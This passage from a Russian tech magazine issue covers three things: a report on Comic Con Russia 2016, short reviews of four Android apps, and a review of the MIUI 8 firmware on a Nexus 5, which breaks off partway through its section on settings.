     комо с таким явлением, как «Игромир», — все-таки это
     старейшая в России выставка (проводится с 2006 года),
     посвященная всему, что связано с индустрией компью-
      терных игр. Однако далеко не все знают, что в последние
      три года в рамках «Игромира» также проводится Comic
     Con Russia, и год от года конвент становится все мас-
      штабнее. И если об «Игромире» расскажут наши коллеги
      из игровых изданий, то главное мероприятие для всех ги-
      ков и нердов мы решили изучить лично.

     НЕМНОГО ИСТОРИИ
       История таких конвентов уходит корнями в шестидеся-
        тые годы. Тогда, в 1964 году, в Нью-Йорке состоялась
        первая посвященная комиксам выставка, организован-
        ная энтузиастами для таких же энтузиастов. Затем идею
       подобных мероприятий подхватили Detroit Triple Fan Fair,
       проводившаяся с 1965 по 1978 годы, и Academy Con,      WARNING
       просуществовавший с 1965 по 1967 годы. В то время                                                                                     Если ты считаешь,
        конвенты были весьма камерными, занимали, как прави-     что комиксы — это фигня
         ло, всего один день и не так часто удостаивались внима-     для детей, а в костюмы
                                                                                      пристало наряжаться        ния крупных представителей индустрии.
                                                                             лишь тем, кто младше
         Но с ростом популярности таких мероприятий отно-                                                                                    двенадцати лет, и только
       шение к ним менялось. Так, в 1970 году в Сан-Диего был       если это оправдано
        основан ежегодный San Diego Comic-Con International    тематическим школьным
                                                                                       утренником, советуем        (также известный как SDCC или просто Comic-Con), тог-                                                                                    воздержаться от прочте-
       да носивший имя Golden State Comic Book Convention.     ния данного материала
       Сегодня об этом ежегодном мероприятии не слышали,      во избежание мораль-
                                                                                      ных травм.        наверное, только те, кто принципиально не интересуется
        поп-культурой и умышленно избегает любых связанных
        с нею вещей.
          Наряду с японским фестивалем Комикет (Comiket) и французским Между-
       народным фестивалем комиксов в Ангулеме (Festival International de la Bande
        Dessinée d’Angoulême), San Diego Comic-Con является одним из крупнейших
        в мире событий такого рода. Изначально он задумывался как фестиваль, по-
       священный комиксам, научной фантастике, фэнтези, а также связанному
        с ними кино и телепередачам. Сейчас мероприятие вышло далеко за эти рамки
       и собрало под своим крылом самые разные поп-культурные явления, начиная
        от компьютерных игр и телесериалов и заканчивая аниме, мангой и коллекци-
       онными карточными играми. Именно здесь можно пообщаться с ведущими ко-
       миксистами планеты, и именно здесь каждый год презентуют новые трейлеры
        блокбастеров и сериалов, новые комиксы, игры и так далее, а их создатели
       щедро раздают эксклюзивные комментарии и общаются с публикой. К тому же
       каждый год SDCC посещает такое количество знаменитостей, что подобное
        скопление можно увидеть разве что на какой-нибудь церемонии вручения ки-
        нопремий.

     COMIC CON RUSSIA
      В мире регулярно проходят десятки подобных конвентов, однако Россия
       до недавнего времени не могла похвастаться тем же. Из крупных фестива-
        лей можно вспомнить разве что «Старкон», однако до размаха SDCC, который
        в последнее время посещают свыше 150 тысяч гостей ежегодно, ему опреде-
        ленно еще далеко.
          Ситуация начала меняться в 2014 году, когда в рамках «Игромира» было
       решено провести первый Comic Con Russia. При этом организаторы сумели
        привезти на мероприятие таких специальных гостей, как Дэвид Ллойд, один
        из авторов графической новеллы V for Vendetta, или известный по сериалу
        «Сверхъестественное» американский актер Миша Коллинз.
         Еще во время анонса мероприятия публика ответила организаторам ско-
       рее скепсисом, нежели энтузиазмом, и многие полагали, что ничего хорошего
        из этой затеи не выйдет, да и с заграничными гостями почти наверняка что-ни-
        будь не сложится. Однако первый Comic Con Russia состоялся, как было за-
        планировано, к великому разочарованию скептиков. Конечно, не обошлось
        без накладок: к примеру, людям приходилось часами стоять в очередях на вхо-
       де и в очередях у стендов, а поклонницы Миши Коллинза едва не сровняли
        «Крокус Экспо» с землей, чего, похоже, от них совершенно не ожидали орга-
        низаторы. Случился даже маленький скандал: издательство «Белый единорог»
       решило начать продажи арт-буков по Dragon Age: Inquisition почти за полтора
       месяца до официального релиза. Разумеется, обладатели эксклюзива тут же
        принялись выкладывать подробные фотографии в интернет, после чего пред-
        ставители BioWare немедленно предъявили серьезные претензии «Белому
        единорогу», а те, в свою очередь, своим покупателям.
           Как бы то ни было, мероприятие состоялось, подкинув всем российским
        гикам темы для обсуждений на ближайшие несколько месяцев. Одно только
        это можно уже смело считать успехом.
         Но останавливаться на достигнутом никто не собирался. Comic Con Russia
       был задуман как ежегодное мероприятие, и он стал им: вот уже третий год
        «Игромир» идет рука об руку с Comic Con. В этом году редакция ][ решила свои-
       ми глазами оценить размах происходящего. Признаться, наши ожидания сложно
       было назвать завышенными, хотя программа мероприятия, списки приглашен-
        ных гостей и запланированных ивентов в этом году выглядели подозрительно
       многообещающе. Направляясь на Comic Con Russia 2016, мы собирались по-
        сетить лишь один из четырех дней выставки и мысленно надеялись, что органи-
        заторы учли ошибки прошлых лет и нас ожидает не многочасовая давка в ря-
        дах чьих-нибудь безумных поклонниц. В результате мы провели на выставке три
        полных дня и поняли, что ошибаться — это порой очень здорово.
            Итак, чем порадовал своих гостей Comic Con Russia 2016, проходивший
        с 30 сентября по 2 октября, и почему посещение этого мероприятия способно
        подарить заряд позитива, которого с лихвой хватит на всю серую и холодную
        осень?

     КОМИКСЫ
        Краеугольный камень любого Comic Con — это, конечно же, комиксы, ведь
       именно с них все начиналось когда-то и именно оттуда «растут ноги» многих
         кино-, теле- и игровых вселенных. В этом году посетители выставки могли по-
       общаться с такими всемирно известными мэтрами, как иллюстратор, художник
        комиксов и журналист Чип Здарски (автор Sex Criminals и Howard the Duck) или
        хорватский художник Горан Парлов (работал над Y: The Last Man и Starlight,
        также известен работой в Marvel над линейкой комиксов Marvel MAX, в частно-
        сти рисует Карателя). Причем можно было как посетить панели-выступления
        мастеров, так и в частном порядке получить автограф или даже персональный
        скетч — все дни мероприятия гости были доступы на своих стендах на Аллее
        авторов. Просто стоять рядом и смотреть, как рисуют эти люди, уже сродни
       наблюдению за неким магическим таинством.





        Российская индустрия комиксов тоже была представлена во всей красе. Так,
       крупнейшее издательство оригинальных комиксов в России, Bubble, устро-
       ило собственную Аллею авторов, а совместно с фестивалем «КомМиссия»
        на Comic Con Russia была организована Аллея авторов КомМиссии, зареги-
        стрироваться для участия в которой могли независимые авторы комиксов,
        манга и других рисованных историй любых жанров.





        Также в рамках Comic Con Russia 2016 прошла презентация первого россий-
        ского фильма, снятого по российскому комиксу, — это «Майор Гром» изда-
        тельства Bubble. «Майор Гром» — один из наиболее удачных продуктов оте-
        чественной комикс-индустрии, издается с 2012 года и уже насчитывает 48
        выпусков. На выставке авторы представили трейлер короткометражки «Майор
        Гром. Выходной», которая должна предварять собой выход полнометражной
        картины, запланированной на 2018 год.





     КИНО
       Крупнейшие киностудии из года в год приводят на Comic Com в Сан-Диего са-
       мый разный эксклюзивный контент, который весь остальной мир увидит в луч-
      шем случае через несколько месяцев. Сегодня российский Comic Con, как это
       ни удивительно, мало отличается от «старших братьев».





       Компания The Walt Disney Company CIS презентовала на выставке проек-
        ты Marvel и «Звездные войны». Так как контент действительно эксклюзивный,
        на входе в кинозал у посетителей изъяли все гаджеты, а затем продемонстри-
        ровали отрывки и новый трейлер «Доктора Стрэнджа», объемный материал,
       посвященный «Стражам Галактики 2», в который вошло куда больше, чем в не-
        давно вышедший трейлер, а также материалы со съемочной площадки фильма
        «Тор: Рагнарек» и «Изгой-один. Звездные войны: Истории».





        Российский кинопроизводитель тоже старается не отставать. Так, Федор Бон-
        дарчук лично представлял на Comic Con Russia свою новую фантастическую
        ленту «Притяжение», Сарик Андреасян совместно с актерами презентовал
        своих «Защитников» (фильм о «российских супергероях»), а Константин Эрнст
       предложил гостям мероприятия посмотреть трейлер фильма и эксклюзивные
       материалы к картине «Викинг». Стоит сказать, что эти фильмы также развле-
        кали гостей и на собственных стендах. К примеру, декораторы и художники
        «Викинга» воссоздали на выставке кусочек Киевской Руси Х века, а на стенде
        «Притяжения» можно было бесплатно зарядить любые гаджеты.





        Также на выставке прошли премьерные показы фильма «Ведьма из Блэр: Но-
        вая глава» и первых эпизодов сериала «Изгоняющий дьявола»; Амедиатека
        представила собственным стендом новое амбициозное шоу телеканала HBO
       «Мир Дикого Запада», а Ubisoft и кинокомпания «Двадцатый Век Фокс СНГ»
        посвятили огромный стенд грядущей экранизации «Кредо убийцы».





     КОСПЛЕЙ
       Шутки про эльфов в маминых занавесках и русский косплей, бессмысленный
       и беспощадный, давно утратили свою актуальность. Хотя прийти на «Игромир»
       и Comic Con в костюме волен любой желающий, крайне серьезно к своим ко-
       стюмам подходят не только аккредитованные, «профессиональные» коспле-
        еры, но и большинство простых посетителей обеих выставок. И косплееров
        много. Нет, не так. Их МНОГО. Эти ребята (и девушки, конечно, девушки) соз-
       дают в «Крокус Экспо» потрясающую атмосферу немного безумного, но очень
       дружелюбного праздника. Хотя Джокеров и Харли Квинн могло было быть
       и меньше :).





       Кроме того, специальной гостьей Comic Con Russia 2016 стала Лианна Вамп,
        американская модель, актриса и всемирно известный косплеер.





      ГОСТИ
        Некоторых именитых гостей Comic Con мы уже перечислили выше, но основ-
       ными звездами «с обложки» мероприятия год из года становятся голливудские
        актеры. В этом году организаторы выставки в некотором роде превзошли са-
       мих себя. Если гостями предыдущих Comic Con Russia были актеры Миша Кол-
        линз («Сверхъестественное»), Альфи Аллен («Игра престолов»), а также актри-
       сы Саммер Глау («Светлячок», «Кукольный дом») и Триша Хелфер («Звездный
        крейсер Галактика»), то на этот раз Россию посетили Нэйтан Филлион («Свет-
         лячок», «Касл»), Майкл Кудлиц («Ходячие мертвецы», «Саутленд») и Себастьян
       Роше («Сверхъестественное»).
           Конечно, здесь особой строкой выделяется визит Нэйтана Филлиона, кото-
        рого любители фантастики со всего мира по-прежнему знают и помнят скорее
         как капитана Малькольма Рейнольдса из «Светлячка», а не как Ричарда Касла
        из одноименного сериала. Имя такого гостя «в обойме» мероприятия ясно го-
        ворит о том, что российский Comic Con растет, развивается и потихоньку при-
        обретает имя и по ту сторону Атлантики.
           Также, говоря о знаменитых гостях, нельзя не отметить уровень организа-
       ции автограф- и фотосессий и выступлений звездных гостей (причем послед-
       ние открыты для всех посетителей конвента). Но об этом ниже.





     ОРГАНИЗАЦИЯ





        Пожалуй, больше всего претензий прошлых лет было связано именно с орга-
        низацией мероприятия. Многочасовые очереди на входе, различные наклад-
        ки по времени, неразбериха с билетами на фотосессии и раздачу автогра-
        фов. Поэтому в завершение этого небольшого отчета хочется сказать именно
       об организации.
         По итогам трех дней, проведенных на выставке, можем сказать, что органи-
        заторы определенно учатся на своих ошибках и заслуживают большого уваже-
        ния и искреннего «спасибо!». На Comic Con Russia 2016 все работало, как от-
       лаженный механизм. Если какие-то накладки и недоразумения возникали, все
       они остались за кадром и гости ничего о них не узнали. С улыбкой работали
         все, начиная волонтерами и заканчивая охраной на входе. Все шоу, выступле-
         ния, панели и презентации начинались вовремя, а неизбежные для таких фе-
        стивалей очереди были четко структурированы и отнимали гораздо меньше
        времени, чем можно представить.
          Единственным существенным минусом по-прежнему можно назвать разве
        что площадь «Крокус Экспо», где проходили обе выставки. В этом году «Игро-
       мир» и Comic Con Russia посетило 163 тысячи человек (новый рекорд!), а свои
        стенды и презентации представили более 250 компаний. В итоге, особенно
        в выходные, «Крокус Экспо» казался слишком маленьким для ивента таких
        масштабов.





          благодарит официальный фотобанк «Игромира» и Comic Con Russia
        за предоставленные фото.
MOBILE


ВЫПУСК #24.
НОВИНКИ
КАРМАННЫЙ                     Сегодня в выпуске:
                    изменяем фон в панели
                      навигации и расширяем
                     ее функциональность
                     без root, добавляемСОФТ
                       в строку состояния датчики
                       нагрузки на процессор
                     и использования интернета,
                     добавляем в Android панель
                      задач в стиле Windows
                     и активируем ночной режим
                       в Android 7.0. Приятного
                         чтения.





NAVBAR APPS
Если стандартная панель навигации, ото-
бражаемая в нижней части экрана смарт-
фонов без физических кнопок навигации,
кажется тебе скучной и неинформативной,
то приложение Navbar Apps для тебя. Нет,
оно не добавляет в него ярлыки приложе-
ний, как можно было бы подумать, про-
читав название, но позволяет изменить
внешний облик панели по своему вкусу.
  С помощью Navbar Apps, например,
можно изменить цвет панели навигации
или использовать в качестве фона одно
из доступных в приложении или создан-
ных другими пользователями изображе-
ний. Можно настроить и динамическое
изменение цвета в зависимости от цве-
товой палитры запущенного приложения.
Правда, работает эта функция не очень
хорошо,  зачастую  цвет  не  совпадает
с цветом строки состояния и даже цвета-
ми приложения.
  Две другие полезные функции — это
показ процента заряда батареи и спектра
проигрываемой в данный момент музыки.                  Navbar Apps
Обе этих функции никак не конфликтуют                 Платформа:
с остальными и дополняют их.                                   Android 5.0
   Приложение бесплатное, без рекла-                  Цена:
мы, не требует root.                                           бесплатно




SYSTEMGLOW
Android  в  своем  первозданном  виде
не имеет никаких средств для показа те-
кущей нагрузки на процессор и фактов ис-
пользования интернета. Даже стрелочки
рядом с иконками Wi-Fi и мобильной сети,
когда-то бывшие стандартной функцией
ОС, со временем исчезли. Так что теперь
приходится ставить либо кастом и софт
с поддержкой root, либо приложения, вы-
водящие уведомления и динамически из-
меняемую иконку в строку состояния.
   SystemGlow предлагает еще один ва-
риант, причем без необходимости иметь
root. В самом верху строки состояния он
выводит две полосы (по умолчанию крас-
ную и синюю), одна из которых служит ин-
дикатором нагрузки на процессор, а вто-
рая —  интенсивности  использования
интернета.
   Единственная  проблема  приложе-
ния в том, что полосы показывают сте-
пень нагрузки изменением не своей
длины,  как, например, Xposed-модуль
Statusbar Download Progress, а «яркости                 SystemGlow
свечения», а если быть точным — сво-                 Платформа:
ей прозрачности. Это очень непривыч-                      Android 4.1
но и не так удобно, но, скорее всего,                  Цена:
без root другой возможности выводить                    бесплатно
индикацию просто нет.



TASKBAR
В Android 7.0 в качестве эксперименталь-
ной опции появилась поддержка  пла-
вающих окон, позволяющих превратить
Android в полноценную многооконную на-
стольную ОС. Проблема только в том, что
в таком режиме система не предпола-
гает никаких средств управления и запу-
ска приложений: все работающие в фоне
приложения просто появляются на экра-
не одновременно в независимых окнах
без всяких панелей, кнопок «Пуск» и про-                   Taskbar
чих атрибутов настольных ОС.                           Платформа:
   Taskbar решает эту проблему с помо-                      Android 5.0
щью скрываемой панели с иконками при-                  Цена:
ложений и аналогом той самой кнопки                    бесплатно
«Пуск». Можно сказать, что это must have
приложение для всех, кто использует ре-
жим плавающих окон, однако Taskbar под-
держивает и более старые версии Android
(начиная с 5.0). Так что его можно исполь-
зовать как один из вариантов быстрого
запуска приложений без возврата на ра-
бочий стол.
   Приложение бесплатное, с открытым
исходным кодом.



NIGHT MODE ENABLER
Еще одна функция Android 7.0, так и не за-
конченная к выпуску окончательной вер-
сии ОС, — это так называемый ночной
режим. Почти все preview-версии Android
N содержали в панели быстрых настроек
кнопку Night Mode, после нажатия на кото-
рую экран включал фильтр синего цвета,
делающий цвета на экране более теплыми
(желтыми). Такой фильтр снижает нагрузку
на глаза в темное время суток и смягчает
эффект подавления выработки мелато-
нина при ярком свете, так что заснуть по-
сле вечернего чтения с экрана становится
проще.
  К сожалению, из-за некоторых багов
Google отключила данную функцию в фи-
нальной версии Android 7.0. Все, что де-
лает Night Mode Enabler, — возвращает ее
на место.
   Кстати, тот же самый эффект, в том
числе на более старых версиях ОС, дают
приложения CF.lumen, f.lux и фильтры си-
него  цвета, которые в изобилии есть
в маркете.                                                    Night Mode
                                                             Enabler
                                                     Платформа:
                                                                    Android 7.0
                                                       Цена:
                                                               бесплатно
MOBILE
КИТАЙСКИЙ





                                                                             Денис Погребной
                                                                                                denis2371@gmail.comANDROIDMIUI ГЛАЗАМИ ИСКУШЕННОГО
ПОЛЬЗОВАТЕЛЯ КАСТОМОВ





В предыдущей статье мы рассмотрели десятку лучших
прошивок для мобильных устройств. Сегодня, как и обе-
щал, я познакомлю тебя с одной из наиболее интересных,
неоднозначных и переоцененных прошивок — MIUI.

Первым делом пройдемся по основным параметрам прошивки:
•  Версия тестируемой прошивки: 6.9.8 (MIUI 8)
•  Версия Android: 6.0 (MRA58K)
•  Обновление безопасности: 2015.12.01

В качестве тестового девайса используем Nexus 5, зарекомендовавший себя
прекрасным подопытным.

Историческая справка

Большая родина MIUI — Китай, а малая — знаменитая китайская компания
Xiaomi, производящая не менее знаменитые смартфоны и все, к чему можно
применить слово «умный».
   Первый смартфон на базе MIUI — Xiaomi Mi1, он же Xiaomi Phone, был анон-
сирован 18 августа 2011 года. Одной из интересных отличительных черт его
стал двойной системный раздел, позволяющий устанавливать две версии про-
шивки: свежую и зарекомендовавшую себя стабильную (если с новой возник-
нут проблемы, это не помешает полноценной работе устройства).
  В 2013 году Xiaomi открыла исходный код MIUI, после чего многие умель-
цы смогли портировать прошивку на различные устройства. Для еще большей
популяризации MIUI компания начала формирование официальных сборок
для смартфонов других компаний (LG, Samsung, Lenovo и другие). На сегод-
няшний день официально MIUI есть более чем на 200 устройствах


УСТАНОВКА
Скачать прошивку можно с официального сайта. Однако брать ее именно от-
туда я бы не рекомендовал: вместе с прошивкой втихаря установится доволь-
но урезанный кастомный рекавери, поддерживающий только вайпы разделов
system, cache, sdcard, data и установку ZIP-файлов, могут возникнуть пробле-
мы с корректной работой и установкой сервисов Google.
   Более  правильный  источник  прошивок  для  владельцев  аппаратов
не от Xiaomi — это сайт miui.su. В их сборки изначально вшиты Play Market, сер-
висы Google и root. Стандартная клавиатура из MIUI заменена на Google Кла-
виатуру, никакой перезаписи рекавери.
   Сразу после установки рекомендую активировать в настройках пункт «Икон-
ки уведомлений», и тогда сигнализировать об уведомлениях будут не три си-
ротливые точки, а иконки программ.

ПЕРВОЕ ВПЕЧАТЛЕНИЕ
В конце установки нам предлагают выбрать одну из нескольких предустанов-
ленных тем. Кстати, почти во всех темах, кроме стандартной, отсутствуют рус-
ские буквы в номеронабирателе, что очень неудобно. Нажимаем на стрелочку
и попадаем на домашний экран. И у тебя в руках новый телефон.
  Я не преувеличиваю: MIUI настолько сильно отличается от «простого
Android», что создается полное ощущение, будто ты приобрел новый смарт-
фон. Интерфейс здесь очень, очень далек от того, что ты привык видеть в дру-
гих прошивках, и напоминает причудливую смесь интерфейсов Samsung
TouchWiz и iOS с большим перекосом в сторону последнего.
   У приложений «Погода», «Календарь», «Часы» есть живые иконки, которые
показывают реальные данные. Нет меню с отдельными приложениями: все
располагается на главном экране. А дизайн переключателя между запущен-
ными приложениями как две капли воды похож на переключалку из iOS, даже
анимацией открытия.





               Лаунчер        Переключатель                   Информация
                            между приложениями                 о системе


ЭКРАН БЛОКИРОВКИ
Пожалуй, это единственное, что разработчики почти полностью позаимство-
вали из голого Android. Но не обошлось и без изменений. Так, приложения
из нижних углов экрана можно открывать простым свайпом влево или вправо,
а не как на AOSP — только из углов экрана. В настройках можно активировать
функцию «Предотвращение случайных нажатий», активировать возможность
включать дисплей кнопками громкости, настроить автовключение экрана
при поступлении
уведомлений и выбрать
приложения, запуска-
емые жестами влево
и вправо с экрана бло-
кировки. Такие настрой-
ки есть во всех касто-
мах, основанных на CM,
так что ничего нового.
   Самая крутая фиш-
ка — «ежедневные
обои»: через опреде-
ленный интервал вре-
мени (по умолчанию
15 минут) меняются
обои из сервера Xiaomi.
При желании можно
ограничить тематику
картинок. Что-то подоб-                                 Экран блокировки           Настраиваем
ное есть в Windows 10                                    ежедневные обои
Anniversary Update.

СТРОКА СОСТОЯНИЯ
Панель уведомлений доступна в двух режимах:
•  одна страница — уведомления + лента из переключателей. Примерно
   как в Android Nougat;
•  две вкладки — уведомления на одной, а переключатели и быстрый переход
   к настройкам на другой вкладке. Дизайн и принцип работы полностью ко-
   пируют панель уведомлений из Android 4.0–4.4. Только вкладки листаются
   свайпом вправо-влево, а не переключаются кнопкой. Что довольно удобно.

В обоих случаях можно
настроить расположе-
ние иконок, включить
или отключить доступ
с экрана блокировки
и активировать свора-
чивание панели после
нажатия быстрых на-
строек. Среди настроек
строки состояния есть:
скорость сети, процент
заряда аккумулятора,
имя оператора, возмож-
ность включить и отклю-
чить показ иконок уве-
домления
приложений — стан-
дартные для других ка-
                                 Панель в стиле               Две страницы
стомов, но отсутствую-                                   «одна страница»
щие в AOSP функции.

ЗВОНИЛКА
Интерфейс   напоминает   наборщик   номера
из AOSP, однако не включает в себя вкладку с ча-
сто набираемыми контактами. В номеронабирате-
ле есть поддержка русских букв, а для всех послед-
них вызовов прямо в списке отображается время
и продолжительность. Есть функция записи звон-
ков, но в тесте записался только голос владельца
записывающего устройства.
   Несколько функций подсмотрены у HTC: отклю-
чение звука при перевороте и уменьшение гром-
кости звонка, когда взял телефон в руку. Есть воз-
можность мигать вспышкой при входящем вызове.
Присутствует функция автоответа, позволяющая
сразу отвечать на все вызовы либо всегда, либо
при подключении гарнитуры. Из CyanogenMod по-
заимствовали вибрацию при ответе собеседника.
В целом, несмотря на некоторые косяки, звонилка
                                                              Набор номеравыше всяких похвал.

КАМЕРА
Фото. Тут все стандартно. В режиме «Авто» настройке поддается только экспо-
зиция. Для этого необходимо тапнуть по экрану и покрутить значок, указывающий
на точку фокусировки. После переключения в «Ручной режим» появляется воз-
можность установить ISO и выбрать баланс белого
(авто, теплый, солнечный, холодный, облачный). Ре-
жим HDR работает быстро, но разница в осветлен-
ности теней по сравнению с обычным режимом ми-
нимальна. Можно снимать панорамы, делать фото
по таймеру и громкому звуку. Есть режим распозна-
ния QR-кодов, сетка, устранение мерцания, отклю-
чение звука съемки, настройка формата снимков
и функций клавиш громкости.
   Видео. Рядовая видеокамера. По умолчанию
установлено HD-разрешение видеосъемки. В на-
стройках можно выбрать качество (Full HD или SD),
режим фокусировки — фиксированный (автофокус
только средствами самого девайса) или по каса-
нию, включить захват кадра при съемке. Есть «Уско-
ренный режим» — timelapse, замедленная съемка
(действительно классный режим). Скорость его ра-
боты тоже регулируется в настройках: от ускорения
                                                               Настройкив два раза (0,06 снимка за одну секунду) до одного                                                             видеокамеры
снимка в 60 секунд (ускорение в 1800 раз).

ДИСПЛЕЙ
LED-индикатор можно только включить или выклю-
чить. Для подстройки придется пользоваться сто-
ронними программами. Размер шрифта настра-
ивается весьма интересным образом: на выбор
предоставляются размеры XS, S, M, L, XL, XXL. Ни-
каких коррекций цвета, цветовых профилей и ноч-
ного режима, как в CyanogenMod и других про-
шивках, нет; только установки яркости и включение
и отключение автояркости.

АНИМАЦИИ И ЗВУКИ
Анимации  отличаются  особой  изысканностью.
При прокрутке создается впечатление резиново-
го списка. Подобное встретишь нечасто. Диалого-
вые окна как будто выползают снизу (где-то я уже
видел подобное). Анимация перелистывания (при
переходе между активити, то есть выборе раз-
личных элементов в настройках или Play Market)             Настройки
внаглую скопирована с iOS. Молодцы, не постес-             дисплея
нялись. А вот звуки звонка, будильника и уведомле-
ний в прошивке свои собственные. И все они с ка-
ким-то китайским акцентом (даже петух кричит как-то по-китайски). Из маркета
можно дополнительно загрузить тысячи различных мелодий. Досадно только,
что их названия тоже на китайском.

ТЕМЫ
По умолчанию присутствует несколько предустановленных тем, а новые мож-
но загрузить из маркета (с интерфейсом на китайском языке). Их очень много,
и почти все платные, но есть возможность опробовать демо, работающее пять
минут.
   Темы умеют изменять значки в настройках, иконки многих известных при-
ложений, до неузнаваемости менять экран блокировки, а также дизайн неко-
торых других графических элементов интерфейса и предустановленных при-
ложений. На первый взгляд, движок тем ничем не отличается от конкурентов.
Посмотрим повнимательнее.
  В CyanogenMod, начиная с 12-й версии, темы научились менять множество
интересных параметров (включая анимацию, иконки, фоны), причем перед
применением темы CM позволяет выбрать, какие именно параметры интер-
фейса ты хочешь поменять, а изменения зачастую затрагивают даже некото-
рые популярные приложения.
   Layers Manager использует слои, встроенные по умолчанию в Android 5+,
не умеет применять шрифты, менять иконки и бутанимации, но может менять
оформление многих известных приложений. Можно вручную выбрать вноси-
мые темой изменения.
   Substratum theme
engine появился не-
давно. Работа основы-
вается тоже на слоях,
но по возможностям
данная программа зна-
чительно превосходит
его. Можно применять
любые компоненты
темы без перезагрузки,
менять любые систем-
ные звуки, шрифты. Еще
и обещают добавить
поддержку смены бута-
нимации и иконок при-
ложений.
   Подведем итог: дви-
жок тем в MIUI весьма                                Ищем тему      Экран блокиров-
средний. У тем дей-                                                      ки — единственное,
ствительно есть много                                    что нельзя настоль-
полномочий для смены                                  ко сильно поменять
                                                         в CyanogenMod с помо-
интерфейса, но рас-                                            щью тем2
страивает, что выбрать
вносимые изменения
нельзя.

MI CLOUD
У Xiaomi есть удобные облачные сервисы. Они позволяют синхронизировать
контакты и журнал вызовов, СМС, фотографии, видео и музыку, заметки, паро-
ли Wi-Fi, записи диктофона, закладки стандартного браузера, отметки в кален-
даре. Это аналог сервисов Google. С помощью того же Mi Cloud можно най-
ти потерянный смартфон, заблокировать его и стереть оттуда данные. Эдакий
аналог Google Device Manager.
Доступны функции полного бэкапа устройства с синхронизацией:
•  приложений, их расположения на рабочем столе. НО! Данные установлен-
   ных приложений не будут синхронизироваться (абсолютно то же самое есть
   в Google Старт);
•  мелодий, обоев, шрифтов;
•  настроек будильников и времени (смарты с гуглосервисами тоже умеют это
   синхронизировать);
•  настроек уведомлений;
•  настроек системы.

Можно включить автоматическое создание бэкапа каждые семь дней либо
каждый день.
   Есть только один недостаток. Бесплатно предоставляется 5 Гбайт ме-
ста для хранения данных (добавить 20 Гбайт на месяц можно за 12 HKD, 100
Гбайт — за 24 HKD, 1024 Гбайт — 120 HKD, где HKD — гонконгский доллар
стоимостью примерно 8,4 рубля). А вот Google бесплатно предоставляет 15
Гбайт, купить дополнительное место можно за обычные рубли, да еще и де-
шевле (139 рублей в месяц — 100 Гбайт, 699 рублей в месяц — 1 Тбайт, 20
990 рублей — 30 Тбайт).
  Еще одна часть Mi Cloud — это СМС через интернет. Для активации необ-
ходимо перейти в «Сообщения», нажать клавишу «Меню» и активировать пункт
«Mi Сообщения». После этого с твоей сим-карты отправится СМС стоимостью
около 5 рублей. Теперь можно бесплатно обмениваться сообщениями через
интернет с другими пользователями MIUI, у которых этот сервис активирован
и включен интернет. В итоге мы получаем аналог Viber, Hangouts, Telegram,
WhatsApp, который не только сильно уступает конкурентам по возможностям,
но и требует отправки платной СМС при первой активации или смене сим-кар-
ты, да еще и работает только на девайсах с MIUI.

БЕЗОПАСНОСТЬ
Сборник интересных функций, который запускается с лаунчера как обычная
программа. Состоит из разделов:
• Очистка — поиск и удаление ненужных файлов и приложений, очистка ке-
   шей. Очень похож на CCleaner.
• Трафик — контроль и учет интернет-трафика. С помощью пары тапов ты
  можешь ограничить доступ к интернету различным приложениям (в CM толь-
   ко сейчас появилась такая возможность), настроить ограничения трафика
   как на месяц, так и на день, посмотреть текущую скорость интернет-соеди-
   нения для любого приложения по отдельности. Этот инструмент значитель-
   но превосходит возможности инструмента из AOSP.
• Черный список — настройка блокировки входящих вызовов и сообщений
   от нежелательных номеров. Данный фильтр есть в CM уже очень давно.
• Батарея — просмотр информации об использовании батареи приложени-
   ями, температуре и текущем состоянии батареи. По сравнению со стан-
   дартным режимом из AOSP добавлена функция включения энергосбере-
   жения по расписанию, отключение интернета через некоторое время после
   выключения экрана, очистка ОЗУ, уведомление о высоком потреблении
   электроэнергии и высокой температуре батареи. После нажатия кнопки
   «Проверка» появится оптимизатор электропитания, который даст полезные
   советы и предложит действия, позволяющие продлить время работы от ба-
   тареи.
• Антивирус — сканирование на вирусы. Поддерживаются базы Avast,
   Tencent, AVL. Базы можно использовать все вместе, но это значительно
   увеличит время сканирования. Есть сканер устанавливаемых приложений,
   который не работа-
   ет (все тестовые ви-
   русы   установились
   без проблем). Одна-
   ко после запуска ска-
   нирования  вручную
   все зловреды были
   обнаружены.
• Разрешения — кон-
   троль разрешений
   из Android 6.0 в но-
   вом интерфейсе.
  Сюда же добавлен
   менеджер автозапу-
   ска и менеджер уста-
   новки.
• Безопасность пла-
  тежей — инструмент
   для поиска уязвимо-                             Оптимизация батареи          Найденные вирусы
   стей и приложений,
   способных перехва-
   тить важные данные.

ИНТЕРЕСНЫЕ НАСТРОЙКИ
Пройдемся по самым интересным функциям.
• Защита приложений. Позволяет поставить графический ключ на запуск
   любых приложений. Этот инструмент не обмануть сменой лаунчера, в отли-
   чие от аналога из CyanogenMod. Однако в тот же CM или голый Android мож-
   но поставить прогу Smart AppLock, до которой штатному блокировщику MIUI
   как до луны по числу полезных функций.
• Клонированные приложения. Для каждого установленного пользовате-
   лем приложения можно создать дополнительную копию. В меню появится
   ярлык клонированного приложения, отмеченный специальным значком.
  В клоны не переносятся настройки из приложения-донора. В итоге можно
   одновременно пользоваться двумя аккаунтами официального приложения
   VK, Instagram и подобных. В чистом Android то же самое можно сделать с по-
  мощью Parallel Space. Еще один вариант для пользователей AOSP: запу-
   стить прогу под именем другого пользователя.
• Для пожилых. Активация приведет к перезагрузке, после чего значки лаун-
   чера станут огромными, почти все приложения переедут в пункт «Меню», по-
   меняется оформление менеджера СМС и телефона, перестанет выдвигать-
   ся строка состояния, слева появится панелька с возможностью добавления
   шести контактов для быстрого звонка. Все остальные программы останут-
   ся без изменений. Подобную, даже более продвинутую функциональность
   можно получить, поставив программу BIG Launcher.
• Родительский контроль. Режим, позволяющий ограничить доступ абсо-
   лютно ко всем приложениям, кроме выбранных, заблокировать отправку
  СМС. Сторонние приложения контроля за детьми, например Kidix, могут
   ограничивать время, сортировать приложения по категориям, ставить от-
   дельный фоновый рисунок, следить за действиями. Кстати, Kidix’у даже пра-
   ва суперпользователя не требуются.
• Управление одной рукой. Одним свайпом по клавишам навигации можно
   уменьшить экран настолько, чтобы с удобством использовать девайс экра-
   ном 5,5–6". Похожий режим встраивают в свои прошивки некоторые извест-
   ные производители.
• Клавиши. Настройка действий клавиш. В Nexus 5 настройке поддается
   только действие при длительном нажатии кнопок. Можно поменять места-
  ми кнопки «Назад» и «Меню», активировать отключение навбара в выбран-
   ных приложениях. Так что этот инструмент во многом уступает CyanogenMod
   и другим прошивкам.
• Помощник нажатий. Это большая плавающая точка, с помощью которой
   можно нажимать клавиши навигации («Назад», «Домой», «Поиск»). Такие
